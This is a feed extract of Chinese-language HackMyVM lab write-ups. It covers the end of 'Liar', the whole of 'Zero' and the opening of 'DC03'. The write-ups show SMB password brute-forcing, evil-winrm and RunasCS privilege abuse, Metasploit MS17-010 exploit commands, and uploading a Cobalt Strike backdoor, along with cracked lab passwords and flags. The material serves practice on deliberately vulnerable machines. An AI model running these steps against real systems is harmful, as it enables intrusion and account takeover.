Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|\_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:2f:a2:49 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-11-20T20:35:07
|\_  start\_date: N/A
|\_clock-skew: -8h20m33s
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.10 seconds
<br>这里只给了一个机器名<br>就不用配置hosts了<br>难得win靶机开了一个网页，看着不像是打域渗透的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" referrerpolicy="no-referrer"><br>还是先看看网页吧，获取到一个用户<br>nica
<br>扫一波目录试试<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# dirsearch -u http://192.168.56.16
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/liar/reports/http\_192.168.56.16/\_24-11-21\_13-01-05.txt

Target: http://192.168.56.16/

[13:01:05] Starting:
[13:01:05] 403 -  312B  - /%2e%2e//google.com
[13:01:05] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[13:01:07] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[13:01:11] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

Task Completed

┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# gobuster dir -u http://192.168.56.16 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
<br>没有什么东西啊<br><br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# smbmap -u guest -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)

┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# smbmap -u anonymous -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>不存在匿名登录与来宾登录<br>尝试对用户nica进行爆破看看<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# crackmapexec smb 192.168.56.16 -u nica -p /usr/share/wordlists/rockyou.txt |grep +
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
<br>成功获取到用户的密码hardcore<br>SMB共享看一下<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# smbmap -u nica -p hardcore  -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.16:445       Name: 192.168.56.16             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# smbclient -U 'nica' //192.168.56.16/IPC$
Password for [WORKGROUP\nica]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT\_STATUS\_NO\_SUCH\_FILE listing \\*
smb: \&gt;
<br>好吧，什么都没有<br><br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# crackmapexec smb 192.168.56.16 -u nica -p hardcore --rid-brute &gt;rid\_brute\_user.txt

┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# wc -l rid\_brute\_user.txt
11 rid\_brute\_user.txt

┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# cat rid\_brute\_user.txt
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [\*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] Brute forcing RIDs
SMB         192.168.56.16   445    WIN-IURF14RBVGV  500: WIN-IURF14RBVGV\Administrador (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  501: WIN-IURF14RBVGV\Invitado (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  503: WIN-IURF14RBVGV\DefaultAccount (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  504: WIN-IURF14RBVGV\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  513: WIN-IURF14RBVGV\Ninguno (SidTypeGroup)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  1000: WIN-IURF14RBVGV\nica (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  1001: WIN-IURF14RBVGV\akanksha (SidTypeUser)
SMB         192.168.56.16   445    WIN-IURF14RBVGV  1002: WIN-IURF14RBVGV\Idministritirs (SidTypeAlias)
<br>可以发现还有一个用户是akanksha<br>再爆破一波这个用户的密码<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# crackmapexec smb 192.168.56.16 -u akanksha -p /usr/share/wordlists/rockyou.txt |grep +
SMB         192.168.56.16   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl
<br>ok,获取到了密码 sweetgirl<br>看看smb共享<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# smbmap -u akanksha -p sweetgirl -H 192.168.56.16

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.16:445       Name: 192.168.56.16             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# smbclient -U akanksha //192.168.56.16/IPC$
Password for [WORKGROUP\akanksha]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT\_STATUS\_NO\_SUCH\_FILE listing \\*
<br>还是什么都没有。我测<br>虽然SMB搞不了。<br>看看能不能winrm连上去<br>检测一下WinRM服务<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# nmap -p 5985,5986 -sT 192.168.56.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:39 CST
Nmap scan report for 192.168.56.16
Host is up (0.00025s latency).

PORT     STATE  SERVICE
5985/tcp open   wsman
5986/tcp closed wsmans
MAC Address: 08:00:27:2F:A2:49 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
<br>可以发现http的非加密端口是开放的。https的端口关闭<br>直接用evil-winrm试试连接<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# evil-winrm -i 192.168.56.16 -u nica -p hardcore

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting\_detection\_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
\*Evil-WinRM\* PS C:\Users\nica\Documents&gt;
<br>nica用户可以登录，akanksha登录不了<br>在nica用户目录下获取flag<br>\*Evil-WinRM\* PS C:\users\nica&gt; type user.txt
HMVWINGIFT
<br>直接上CS<br>\*Evil-WinRM\* PS C:\users\nica&gt; upload /home/kali/hmv/liar/4444.exe

Info: Uploading /home/kali/hmv/liar/4444.exe to C:\users\nica\4444.exe

Data: 394580 bytes of 394580 bytes copied

Info: Upload successful!
<br>纳尼。运行不了。我测<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.002.png" referrerpolicy="no-referrer"><br><br>看了一下wp 原来可以用<a data-tooltip-position="top" aria-label="../../26-工具使用/RunasCS使用" data-href="../../26-工具使用/RunasCS使用" href="https://www.c1trus.top/26-工具使用/runascs使用.html" class="internal-link" target="_self" rel="noopener nofollow">RunasCS</a>.exe<br>这个工具允许我们当前用户用另外一个用户的权限执行命令，前提是需要另一个用户的账号密码<br>这里我们刚好满足，因为akanksha用户无法winrm登录。但是我们知道他的密码那我们就可以以他的权限执行命令<br>\*Evil-WinRM\* PS C:\users\nica&gt; .\runascs.exe akanksha sweetgirl "cmd /c whoami /all"


INFORMACIàN DE USUARIO
----------------------

Nombre de usuario        SID
======================== ==============================================
win-iurf14rbvgv\akanksha S-1-5-21-2519875556-2276787807-2868128514-1001


INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID                                            Atributos
============================================ ============== ============================================== ========================================================================
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESIàN EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192


INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
<br>WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo 
<br>可以发现这个用户是属于管理员组的<br>直接读取flag<br>\*Evil-WinRM\* PS C:\users\nica&gt; .\runascs.exe akanksha sweetgirl "cmd /c type c:\users\Administrador\root.txt"

HMV1STWINDOWZ
]]></description><link>https://www.c1trus.top/24-渗透/hmv/24.liar.html</link><guid isPermaLink="false">24-渗透/HMV/24.liar.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[23.Zero]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 获取一个AD用户" data-href="#3. 获取一个AD用户" href="https://www.c1trus.top/about:blank#3._获取一个AD用户" class="internal-link" target="_self" rel="noopener nofollow">3. 获取一个AD用户</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMB空会话检测" data-href="#3.1. SMB空会话检测" href="https://www.c1trus.top/about:blank#3.1._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMB空会话检测</a>
<br><a data-tooltip-position="top" aria-label="3.2. kerbrute爆破用户" data-href="#3.2. kerbrute爆破用户" href="https://www.c1trus.top/about:blank#3.2._kerbrute爆破用户" class="internal-link" target="_self" rel="noopener nofollow">3.2. kerbrute爆破用户</a>


<br><a data-tooltip-position="top" aria-label="4. 再打MS17-010" data-href="#4. 再打MS17-010" href="https://www.c1trus.top/about:blank#4._再打MS17-010" class="internal-link" target="_self" rel="noopener nofollow">4. 再打MS17-010</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Zero
<br>作者：[ruycr4ft](https://hackmyvm.eu/profile/?user=ruycr4ft)
<br>难度：⭐️
<br>知识点：MS17-010
<br><br> fscan -h 192.168.56.15

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.15:445 open
192.168.56.15:139 open
192.168.56.15:135 open
192.168.56.15:88 open
[\*] alive ports len is: 4
start vulscan
[+] MS17-010 192.168.56.15      (Windows Server 2016 Standard Evaluation 14393)
[\*] NetBios 192.168.56.15   [+] DC:DC01.zero.hmv                 Windows Server 2016 Standard Evaluation 14393
[\*] NetInfo
[\*]192.168.56.15
   [-&gt;]DC01
   [-&gt;]192.168.56.15
已完成 4/4
[\*] 扫描结束,耗时: 3.061390899s

┌──(root㉿kali)-[/home/kali/hmv/Zero]
└─# nmap -sC -sV 192.168.56.15 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 07:06 CST
Nmap scan report for 192.168.56.15
Host is up (0.00015s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-20 22:37:00Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup:
464/tcp  open  kpasswd5?
593/tcp  open  ncacn\_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Defaute-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:CB:14:11 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:cb:14:11 (Oracle Virtual NIC)
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3
|   Computer name: DC01
|   NetBIOS computer name: DC01\x00
|   Domain name: zero.hmv
|   Forest name: zero.hmv
|   FQDN: DC01.zero.hmv
|\_  System time: 2024-11-20T14:37:01-08:00
|\_clock-skew: mean: 2h09m55s, deviation: 4h37m07s, median: -30m04s
| smb-security-mode:
|   account\_used: guest
|   authentication\_level: user
|   challenge\_response: supported
|\_  message\_signing: required
| smb2-time:
|   date: 2024-11-20T22:37:01
|\_  start\_date: 2024-11-20T22:35:17
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
<br>配置/etc/hosts<br>192.168.56.15 DC01.zero.hmv  zero.hmv
<br>发现有永恒之蓝。<br>直接上msf打一波看看<br>use exploit/windows/smb/ms17\_010\_eternalblue
set payload windows/x64/meterpreter/bind\_tcp\_uuid
set rhosts 172.22.11.45
run
<br>直接给靶机干蓝屏了。重新利用好像不行了。<br>还是正常打吧。<br><br><br>┌──(root㉿kali)-[/home/kali/hmv/Zero]
└─# smbmap -u guest -H zero.hmv

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>没有<br><br>┌──(root㉿kali)-[/home/kali/hmv/Zero]
└─# kerbrute userenum -d zero.hmv -t 100 --dc DC01.zero.hmv /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o valid\_user.txt

    \_\_             \_\_               \_\_
   / /\_\_\_\_\_  \_\_\_\_\_/ /\_  \_\_\_\_\_\_\_  \_\_/ /\_\_\_\_
  / //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
 / ,&lt; /  \_\_/ /  / /\_/ / /  / /\_/ / /\_/  \_\_/
/\_/|\_|\\_\_\_/\_/  /\_.\_\_\_/\_/   \\_\_,\_/\\_\_/\\_\_\_/

Version: v1.0.3 (9dad6e1) - 11/21/24 - Ronnie Flathers @ropnop

2024/11/21 07:23:00 &gt;  Using KDC(s):
2024/11/21 07:23:00 &gt;   DC01.zero.hmv:88

2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       administrator@zero.hmv
2024/11/21 07:23:00 &gt;  [+] VALID USERNAME:       Administrator@zero.hmv
2024/11/21 07:26:17 &gt;  [+] VALID USERNAME:       dc01@zero.hmv
2024/11/21 07:27:35 &gt;  Done! Tested 8295455 usernames (3 valid) in 275.149 seconds
<br>也没有什么东西<br><br>msf里面可不止一种MS17-010的利用<br>msf6 &gt; search ms17

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank     Check  Description
   -   ----                                                  ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17\_010\_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \\_ target: Automatic Target                         .                .        .      .
   2     \\_ target: Windows 7                                .                .        .      .
   3     \\_ target: Windows Embedded Standard 7              .                .        .      .
   4     \\_ target: Windows Server 2008 R2                   .                .        .      .
   5     \\_ target: Windows 8                                .                .        .      .
   6     \\_ target: Windows 8.1                              .                .        .      .
   7     \\_ target: Windows Server 2012                      .                .        .      .
   8     \\_ target: Windows 10 Pro                           .                .        .      .
   9     \\_ target: Windows 10 Enterprise Evaluation         .                .        .      .
   10  exploit/windows/smb/ms17\_010\_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \\_ target: Automatic                                .                .        .      .
   12    \\_ target: PowerShell                               .                .        .      .
   13    \\_ target: Native upload                            .                .        .      .
   14    \\_ target: MOF upload                               .                .        .      .
   15    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
   16    \\_ AKA: ETERNALROMANCE                              .                .        .      .
   17    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
   18    \\_ AKA: ETERNALBLUE                                 .                .        .      .
   19  auxiliary/admin/smb/ms17\_010\_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \\_ AKA: ETERNALSYNERGY                              .                .        .      .
   21    \\_ AKA: ETERNALROMANCE                              .                .        .      .
   22    \\_ AKA: ETERNALCHAMPION                             .                .        .      .
   23    \\_ AKA: ETERNALBLUE                                 .                .        .      .
   24  auxiliary/scanner/smb/smb\_ms17\_010                    .                normal   No     MS17-010 SMB RCE Detection
   25    \\_ AKA: DOUBLEPULSAR                                .                .        .      .
   26    \\_ AKA: ETERNALBLUE                                 .                .        .      .
   27  exploit/windows/fileformat/office\_ms17\_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
   28  auxiliary/admin/mssql/mssql\_escalate\_execute\_as       .                normal   No     Microsoft SQL Server Escalate EXECUTE AS
   29  auxiliary/admin/mssql/mssql\_escalate\_execute\_as\_sqli  .                normal   No     Microsoft SQL Server SQLi Escalate Execute AS
   30  exploit/windows/smb/smb\_doublepulsar\_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   31    \\_ target: Execute payload (x64)                    .                .        .      .
   32    \\_ target: Neutralize implant                
<br>试试exploit/windows/smb/ms17_010_psexec <br>use exploit/windows/smb/ms17\_010\_psexec 
set rhost
run
<br>上传cs后门并运行<br>upload 4444.exe C:\\4444.exe
excute -f C:\\4444.exe
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" referrerpolicy="no-referrer"><br>system权限 已经拿下了<br>HMV{Z3r0\_l0g0n\_!s\_Pr3tty\_D4ng3r0u$}
HMV{D0nt\_r3us3\_p4$$w0rd5!}
]]></description><link>https://www.c1trus.top/24-渗透/hmv/23.zero.html</link><guid isPermaLink="false">24-渗透/HMV/23.Zero.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/23.Zero.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[22.DC03]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 获取一个可用的AD用户" data-href="#3. 获取一个可用的AD用户" href="https://www.c1trus.top/about:blank#3._获取一个可用的AD用户" class="internal-link" target="_self" rel="noopener nofollow">3. 获取一个可用的AD用户</a>

<br><a data-tooltip-position="top" aria-label="3.1. SMB空会话检测" data-href="#3.1. SMB空会话检测" href="https://www.c1trus.top/about:blank#3.1._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3.1. SMB空会话检测</a>
<br><a data-tooltip-position="top" aria-label="3.2. Kerbrute爆破" data-href="#3.2. Kerbrute爆破" href="https://www.c1trus.top/about:blank#3.2._Kerbrute爆破" class="internal-link" target="_self" rel="noopener nofollow">3.2. Kerbrute爆破</a>
<br><a data-tooltip-position="top" aria-label="3.3. NTML Relay" data-href="#3.3. NTML Relay" href="https://www.c1trus.top/about:blank#3.3._NTML_Relay" class="internal-link" target="_self" rel="noopener nofollow">3.3. NTML Relay</a>


<br><a data-tooltip-position="top" aria-label="4. 获取到用户的后续利用" data-href="#4. 获取到用户的后续利用" href="https://www.c1trus.top/about:blank#4._获取到用户的后续利用" class="internal-link" target="_self" rel="noopener nofollow">4. 获取到用户的后续利用</a>

<br><a data-tooltip-position="top" aria-label="4.1. 获取用户的SMB共享" data-href="#4.1. 获取用户的SMB共享" href="https://www.c1trus.top/about:blank#4.1._获取用户的SMB共享" class="internal-link" target="_self" rel="noopener nofollow">4.1. 获取用户的SMB共享</a>
<br><a data-tooltip-position="top" aria-label="4.2. smbcilent连接smb共享" data-href="#4.2. smbcilent连接smb共享" href="https://www.c1trus.top/about:blank#4.2._smbcilent连接smb共享" class="internal-link" target="_self" rel="noopener nofollow">4.2. smbcilent连接smb共享</a>
